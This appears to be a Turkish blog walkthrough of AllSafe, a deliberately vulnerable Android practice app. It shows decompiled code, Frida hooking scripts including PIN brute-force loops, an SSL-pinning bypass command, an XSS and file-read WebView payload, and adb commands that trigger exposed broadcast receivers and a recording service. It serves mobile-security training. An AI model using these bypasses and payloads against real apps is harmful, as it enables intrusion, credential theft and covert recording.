---
layout: post
title: "AllSafe APK Walkthrough"
date: 2026-07-28

category: APK

image: /assets/posts/allsafe-apk/allsafecover.png

excerpt: AllSafe APK Çözümü

tags: 
- Mobile Security
- APK

---

<img src="/assets/posts/allsafe-apk/screenshot1.png" width="400" >


## Insecure Logging 

<img src="/assets/posts/allsafe-apk/image (1).png" width="400" >

```java
static /* synthetic */ boolean lambda$onCreateView$0(TextInputEditText secret, TextView v, int actionId, KeyEvent event) {
        if (actionId != 6) {
            return false;
        }
        Editable text = secret.getText();
        Objects.requireNonNull(text);
        if (!text.toString().equals("")) {
            Log.d("ALLSAFE", "User entered secret: " + secret.getText().toString());
            return false;
        }
        return false;
    }
```

<img src="/assets/posts/allsafe-apk/image (2).png" width="700" >

Buradaki zafiyet, input olarak ne verilirse log’a düşmesi.

## Hardcoded Credentials

<img src="/assets/posts/allsafe-apk/image (3).png" width="700" >

<img src="/assets/posts/allsafe-apk/image (4).png" width="700" >

<img src="/assets/posts/allsafe-apk/image (5).png" width="700" >

<img src="/assets/posts/allsafe-apk/image (6).png" width="700" >

Buradaki zafiyetler, kaynak kodun içerisinde bazı kimlik bilgilerinin yazılmış olması.

## Firebase Database

<img src="/assets/posts/allsafe-apk/image (7).png" width="700" >

<img src="/assets/posts/allsafe-apk/image (8).png" width="700" >

/resources.arsc/res/values/strings.xml den bulduğum firebase database url’si ile flag’i elde ettim. Firebase, verileri JSON benzeri belgelerde depolayan bir noSQL veritabanı programı olarak sınıflandırılır.

## Insecure Shared Preferences

<img src="/assets/posts/allsafe-apk/image (9).png" width="700" >

<img src="/assets/posts/allsafe-apk/image (10).png" width="700" >

Buradaki zafiyet, emülatöre girilen inputlar sharedpref’e kayıt ediliyor.

Emülatöre input girmeden frida ile sharedpref’e input gönderme

```java
Java.perform(function () {
    var SharedPreferencesImpl = Java.use("android.app.SharedPreferencesImpl$EditorImpl"); 
    SharedPreferencesImpl.putString.implementation = function (key, value) {
        console.log(key ,value);
        return this.putString(key, value); 
    };

    var context = Java.use("android.app.ActivityThread").currentApplication().getApplicationContext();
    var prefs = context.getSharedPreferences("user", 0);
    var editor = prefs.edit();
    editor.putString("username", "user");
    editor.putString("password", "pass");
    editor.commit(); 
});

```

## SQL Injection

<img src="/assets/posts/allsafe-apk/image (11).png" width="700" >

<img src="/assets/posts/allsafe-apk/image (12).png" width="500" >

<img src="/assets/posts/allsafe-apk/image (13).png" width="500" >

SQL injection yapmasak bile zaten bilgileri kaynak kodta verilmiş credentials.

<img src="/assets/posts/allsafe-apk/image (14).png" width="700" >



## PIN Bypass

Kaynak kodu incelediğimde,

<img src="/assets/posts/allsafe-apk/image (15).png" width="700" >

önce verilen input’un boş olmadığını, sonra da null olup olmadığını kontrol edip checkpin ‘in doğru değerinde ve yanlış değerinde verilecek mesajları yazdırıyor. Biraz aşağı indiğimde,

<img src="/assets/posts/allsafe-apk/image (16).png" width="400" >

bir base64 decode edildiğini görüyorum.

```jsx
Java.perform(function () {
    var Base64 = Java.use("android.util.Base64");
    // decode(String, int) fonksiyonunu izliyoruz
    Base64.decode.overload("java.lang.String", "int").implementation = function (gizliYazi, flags) {
        console.log(gizliYazi);

        var sonuc = this.decode(gizliYazi, flags);

        // Byte array → string'e çevir
        var gizliPin = Java.use("java.lang.String").$new(sonuc);
        console.log(gizliPin);  //Burada asıl pin'i veriyor

        return sonuc;
    };
});

```

Bu frida scripti ile input olarak verilen random sayı ile asıl pin’e ulaşıyoruz.

Başka bulduğum script örnekleri

```jsx
Java.perform(function(){

    var pinClass = Java.use("infosecadventures.allsafe.challenges.PinBypass");
    pinClass.checkPin.implementation = function(pin){
        for(var i = 0; i <= 9999; i++){
            var isValidPin = this.checkPin(String(i).padStart(4,0));
            if (isValidPin){
                console.log("[+] Valid PIN found: " + i);
                break;
            }
        }
        return true;
    }
});
```

```jsx
Java.perform(function(){
	Java.choose('infosecadventures.allsafe.challenges.PinBypass',{
		onMatch: function(instance){
			for(var i=1000;i<10000;i++)
			{
				console.log("Checking "+i.toString())
				if(instance.checkPin(i.toString())== true)
				{
					console.log("Pin found : "+i.toString());
					break;
				}
			}
	},
	onComplete: function() {}
	});
});
```

## Deep Link Exploitation

<img src="/assets/posts/allsafe-apk/image (17).png" width="700" >

<img src="/assets/posts/allsafe-apk/image (18).png" width="700" >

<img src="/assets/posts/allsafe-apk/image (19).png" width="400" >


```java
adb shell am start -a "android.intent.action.VIEW" -d "allsafe://infosecadventures/congrats?key=ebfb7ff0-b2f6-41c8-bef3-4fba17be410c"
```

## Vulnerable WebView

```java

    public /* synthetic */ void lambda$onCreateView$0$VulnerableWebView(TextInputEditText payload, WebView webView, View v) {
        Editable text = payload.getText();
        Objects.requireNonNull(text);
        if (!text.toString().isEmpty()) {
            Editable text2 = payload.getText();
            Objects.requireNonNull(text2);
            if (URLUtil.isValidUrl(text2.toString())) {
                webView.loadUrl(payload.getText().toString());
                return;
            } else {
                webView.setWebChromeClient(new WebChromeClient());
                webView.loadData(payload.getText().toString(), "text/html", "UTF-8");
                return;
            }
        }
        SnackUtil.INSTANCE.simpleMessage(requireActivity(), "No payload provided!");
    }
}
```

Kullanıcının girdiği her şeyi HTML olarak yorumlayıp çalıştırıyor.

<img src="/assets/posts/allsafe-apk/image (20).png" width="400" > 

```bash
first task : <svg onload=alert(”selam”) >
```

<img src="/assets/posts/allsafe-apk/image (21).png" width="400" >

```bash
second task: file://etc/hosts
```

<img src="/assets/posts/allsafe-apk/image (22).png" width="400" >

```bash
benim örneğim: https://www.google.com/
```

## Insecure Broadcast Receiver

```java

    public /* synthetic */ void lambda$onCreateView$0$InsecureBroadcastReceiver(TextInputEditText note, View v) {
        if (!note.getText().toString().isEmpty()) {
            // Kullanıcıdan alınan not boş değilse bir intent oluşturuluyor
            Intent intent = new Intent();
            intent.setAction("infosecadventures.allsafe.action.PROCESS_NOTE");
            
            // intente bazı bilgiler ekleniyor
            intent.putExtra("server", "prod.allsafe.infosecadventures.io");
            intent.putExtra("note", note.getText().toString());
            intent.putExtra("notification_message", "Allsafe is processing your note...");
            
            // intent'i kimler alacak onu belirliyor 
            PackageManager packageManager = requireActivity().getPackageManager();
            List<ResolveInfo> resolveInfos = packageManager.queryBroadcastReceivers(intent, 0);
            
            // Bulduğu her uygulamaya intent gönderiyor
            for (ResolveInfo info : resolveInfos) {
                ComponentName cn = new ComponentName(info.activityInfo.packageName, info.activityInfo.name);
                intent.setComponent(cn);
                requireActivity().sendBroadcast(intent);
            }
            SnackUtil.INSTANCE.simpleMessage(requireActivity(), "Saving note...");
            return;
        }
        SnackUtil.INSTANCE.simpleMessage(requireActivity(), "The note field can't be empty!");
    }
```

Kullanıcının girdiği notu bir intent'e ekleyip, bu intent'i cihazdaki ilgili tüm uygulamalara broadcast olarak gönderiyor.

```java
public void onReceive(Context context, Intent intent) {
        // Intent’ten veri çekiliyor
        String server = intent.getStringExtra("server");
        String note = intent.getStringExtra("note");
        String notification_message = intent.getStringExtra("notification_message");
        
        // HTTP URL oluşturuluyor
        OkHttpClient okHttpClient = new OkHttpClient.Builder().build();
        HttpUrl httpUrl = new HttpUrl.Builder().scheme("http").host(server).addPathSegment("api").addPathSegment("v1").addPathSegment("note").addPathSegment("add").addQueryParameter("auth_token", "YWxsc2FmZV9kZXZfYWRtaW5fdG9rZW4=").addQueryParameter("note", note).build();
        Log.d("ALLSAFE", httpUrl.getUrl());
        
        // HTTP isteği gönderiliyor
        Request request = new Request.Builder().url(httpUrl).build();
        okHttpClient.newCall(request).enqueue(new Callback() { // from class: infosecadventures.allsafe.challenges.NoteReceiver.1
            @Override // okhttp3.Callback
            public void onFailure(Call call, IOException e) {
                Log.d("ALLSAFE", e.getMessage());
            }

            @Override // okhttp3.Callback
            public void onResponse(Call call, Response response) throws IOException {
                ResponseBody body = response.body();
                Objects.requireNonNull(body);
                Log.d("ALLSAFE", body.string());
            }
        });
        // Bildirim gösteriliyor
        NotificationCompat.Builder builder = new NotificationCompat.Builder(context, "ALLSAFE");
        builder.setContentTitle("Notification from Allsafe");
        builder.setContentText(notification_message);
        builder.setSmallIcon(R.mipmap.ic_launcher_round);
        builder.setAutoCancel(true);
        builder.setChannelId("ALLSAFE");
        Notification notification = builder.build();
        NotificationManager notificationManager = (NotificationManager) context.getSystemService("notification");
        NotificationChannel notificationChannel = new NotificationChannel("ALLSAFE", "ALLSAFE_NOTIFICATION", 4);
        notificationManager.createNotificationChannel(notificationChannel);
        notificationManager.notify(1, notification);
    }
}
```

Alınan broadcast içindeki not verisini sunucuya HTTP isteğiyle gönderiyor ve kullanıcıya bir bildirim gösteriyor.

```java
PS C:\Users\Neslihan> adb shell am broadcast -a "infosecadventures.allsafe.action.PROCESS_NOTE" --es server '192.168.16.101' --es note 'Hello,World' --es notification_message 'Compromised' -n infosecadventures.allsafe/.challenges.NoteReceiver
```

## Certificate Pinning

!image.png

Sertifika pinleyip httpbin.org sitesine güvenli bir istek yapar.

```java
frida -U --codeshare pcipolloni/universal-android-ssl-pinning-bypass-with-frida -f infosecadventures.allsafe --no-pause
```

Bu script HTTPS trafiğini kesmek ve ssl pinning'i atlatmak için kullanılır.

## Insecure Service

<img src="/assets/posts/allsafe-apk/image (23).png" width="500" >

<img src="/assets/posts/allsafe-apk/image (24).png" width="500" >

Uygulamadaki butona tıklandığında servis başlatılıyor.

<img src="/assets/posts/allsafe-apk/image (25).png" width="500" >

Ses kaydını başlatır; kaydı 10 saniyeyle sınırlar, kalite ve format ayarlarını yapar, dosya oluşturur, kayda başlar ve hata olursa loglar.

```java
private File getOutputFile() {
        SimpleDateFormat dateFormat = new SimpleDateFormat("yyyyMMdd_HHmmssSSS", Locale.US);
        String fullPath = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).getAbsolutePath() + "/allsafe_rec_" + dateFormat.format(new Date()) + ".mp3";
        Toast.makeText(getApplicationContext(), "File: " + fullPath, 0).show();
        return new File(fullPath);
    }
```

Dosya adı zaman damgasıyla oluşturup, `Downloads` klasörüne `.mp3` uzantılı dosya yolu verir ve bu yolu gösteren kısa bir bildirim (toast) çıkarır.

```java
adb shell am startservice infosecadventures.allsafe/.challenges.RecorderService
```


Kaynak: [AllSafe Android](https://github.com/t0thkr1s/allsafe-android)